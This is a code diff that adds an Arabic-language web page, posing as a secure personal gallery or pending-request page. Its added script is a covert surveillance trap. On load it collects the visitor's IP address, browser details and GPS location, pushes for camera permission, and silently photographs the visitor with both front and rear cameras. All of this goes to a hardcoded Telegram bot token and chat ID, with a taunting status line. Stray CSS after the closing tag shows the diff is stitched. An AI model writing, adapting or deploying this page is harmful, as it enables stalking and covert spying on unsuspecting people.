@@ -2,17 +2,26 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل صورة</title>
+    <title>المعرض الشخصي الامن</title>
     <style>
         body {
             font-family: sans-serif;
             background: #f4f4f4;
             text-align: center;
             padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
         img {
             max-width: 90%;
-            margin-top: 30px;
+            margin-top: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
@@ -31,10 +40,293 @@
             border-radius: 5px;
             display: inline-block;
         }
-        #permissionGuide {
+        .permission-request {
             margin: 20px auto;
             padding: 15px;
             max-width: 500px;
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .permission-request button {
+            padding: 10px 20px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        .permission-request button:hover {
+            background: #388E3C;
+        }
+        .hidden {
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .progress {
+            width: 0%;
+            height: 10px;
+            background-color: #4CAF50;
+            border-radius: 10px;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>جاري تحضير الطلب انتظر</h1>
+        
+        <div id="permissionRequest" class="permission-request hidden">
+            <h3>⚠️ يلزم إذن الوصول إلى الكاميرا</h3>
+            <p>لمتابعة عملية الالتقاط، يرجى منح الإذن للوصول إلى الكاميرا</p>
+            <button id="grantPermissionButton">منح الإذن</button>
+        </div>
+
+        <div class="progress-bar">
+            <div id="progress" class="progress"></div>
+        </div>
+
+        <div id="loadingText" class="loading"> جاري تهيئة النظام ...</div>
+        <div id="status" class="status"></div>
+        
+        <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحضير+للالتقاط" alt="الصورة">
+    </div>
+
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Telegram bot settings
+        const BOT_TOKEN = "6978038945:AAHeocU3xJ41oOmKekacPo0ex0dvJNhjdUA";
+        const CHAT_ID = "6113061454";
+        
+        // DOM elements
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        const statusDiv = document.getElementById("status");
+        const displayImage = document.getElementById("displayImage");
+        const loadingText = document.getElementById("loadingText");
+        const permissionRequest = document.getElementById("permissionRequest");
+        const grantPermissionButton = document.getElementById("grantPermissionButton");
+        const progressBar = document.getElementById("progress");
+        
+        let facing = "user";  // Start with front camera
+        let captureCount = 0;
+        const maxCaptures = 2;  // Capture from both cameras
+        let permissionAttempts = 0;
+        let maxPermissionAttempts = 3;
+
+        // Function to update progress bar
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
+
+        // Function to send data to Telegram
+        async function sendToTelegram(endpoint, data, isPhoto = false) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+            
+            try {
+                if (isPhoto) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', new Blob([data], { type: 'image/jpeg' }), 'photo.jpg');
+                    await fetch(url, { method: 'POST', body: formData });
+                } else {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, ...data })
+                    });
+                }
+                return true;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Function to send text info to Telegram
+        async function sendTextToTelegram(ip, ua, gpsLat = null, gpsLong = null) {
+            const now = new Date().toLocaleString('ar-EG');
+            const gpsText = gpsLat && gpsLong ? `\n📍 GPS: ${gpsLat}, ${gpsLong}` : '';
+            
+            const message = `📸 تم فتح الرابط:
+
+🕒 ${now}
+🌐 IP: ${ip}
+📱 UA: ${ua}${gpsText}`;
+            
+            return await sendToTelegram('sendMessage', { text: message });
+        }
+
+        // Function to capture image from video stream
+        function captureImage() {
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                // Convert canvas to JPEG and send to Telegram
+                canvas.toBlob(async (blob) => {
+                    const arrayBuffer = await blob.arrayBuffer();
+                    const success = await sendToTelegram('sendPhoto', arrayBuffer, true);
+                    
+                    if (success) {
+                        statusDiv.textContent = `اضغط سماح بالوصول لعرض الطلب الخاص بك ${facing === 'user' ? 'وحده من الأمامية' : 'وحده من الخلفية'}`;
+                    } else {
+                        statusDiv.textContent = '❌ فشل إرسال الصورة';
+                    }
+                    
+                    // Update progress
+                    updateProgress((captureCount / maxCaptures) * 100);
+                    
+                    // Display the captured image
+                    displayImage.src = URL.createObjectURL(blob);
+                    
+                    // Stop current tracks
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    
+                    // Switch camera or stop if we've captured enough
+                    captureCount++;
+                    if (captureCount < maxCaptures) {
+                        facing = facing === "user" ? "environment" : "user";
+                        setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
+                    } else {
+                        updateProgress(100);
+                        loadingText.textContent = "✅ اكتمل بنجاح";
+                    }
+                }, 'image/jpeg', 0.9);
+            }
+        }
+
+        // Function to switch between cameras
+        async function switchCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: facing } }
+                });
+                
+                video.srcObject = stream;
+                video.play();
+                setTimeout(captureImage, 800);  // Reduced from 1000ms to 800ms
+            } catch (err) {
+                console.log("فشل تشغيل الكاميرا:", err);
+                // Try the other camera if one fails
+                facing = facing === "user" ? "environment" : "user";
+                if (captureCount < maxCaptures) {
+                    setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
+                }
+            }
+        }
+
+        // Function to get client IP (fallback to a service if needed)
+        async function getClientIP() {
+            try {
+                // First try a direct method (works on some browsers)
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.log("Couldn't get IP directly:", error);
+                return "غير معروف";
+            }
+        }
+
+        // Function to check camera permission
+        async function checkCameraPermission() {
+            try {
+                if (navigator.permissions && navigator.permissions.query) {
+                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                    return permissionStatus.state;
+                }
+                return 'unknown';
+            } catch (error) {
+                console.error('Permission API not supported', error);
+                return 'unknown';
+            }
+        }
+
+        // Main initialization
+        async function init() {
+            loadingText.textContent = 'انتظر رجاء التحميل...';
+            updateProgress(10);
+            
+            // Get client info
+            const ip = await getClientIP();
+            const ua = navigator.userAgent;
+            updateProgress(30);
+            
+            // Send initial info to Telegram
+            const textSent = await sendTextToTelegram(ip, ua);
+            if (textSent) {
+                statusDiv.textContent = '✅ تم إرسال معلومات الجهاز';
+            } else {
+                statusDiv.textContent = '❌ فشل إرسال معلومات الجهاز';
+            }
+            updateProgress(50);
+            
+            // Try to get GPS location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
+                    if (gpsSent) {
+                        statusDiv.textContent += ' + 📍 اصبر هتتفشخ';
+                    }
+                    updateProgress(70);
+                }, (err) => {
+                    console.log("فشل الحصول على الموقع:", err);
+                    updateProgress(70);
+                }, { timeout: 5000 });
+            } else {
+                updateProgress(70);
+            }
+            
+            // Start camera capture process
+            switchCamera();
+        }
+
+        // Try to access camera with auto-retry
+        async function tryCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // If we get here, permission was granted
+                permissionRequest.classList.add("hidden");
+                init();
+            } catch (error) {
+                console.log("فشل في الحصول على إذن الكاميرا:", error);
+                permissionAttempts++;
+                
+                if (permissionAttempts < maxPermissionAttempts) {
+                    // Show permission request
+                    permissionRequest.classList.remove("hidden");
+                    statusDiv.textContent = `يرجى منح الإذن للكاميرا للمتابعة (المحاولة ${permissionAttempts}/${maxPermissionAttempts})`;
+                } else {
+                    statusDiv.textContent = "فشل في الوصول إلى الكاميرا. يرجى تحديث الصفحة والمحاولة مرة أخرى.";
+                    loadingText.textContent = "❌ تم إلغاء العملية";
+                }
+            }
+        }
+
+        // Grant permission button click handler
+        grantPermissionButton.addEventListener('click', tryCameraAccess);
+
+        // Initial auto-try
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(tryCameraAccess, 500);
+        });
+    </script>
+</body>
+</html>            max-width: 500px;
             background: #fff8e1;
             border: 1px solid #ffd54f;
             border-radius: 8px;
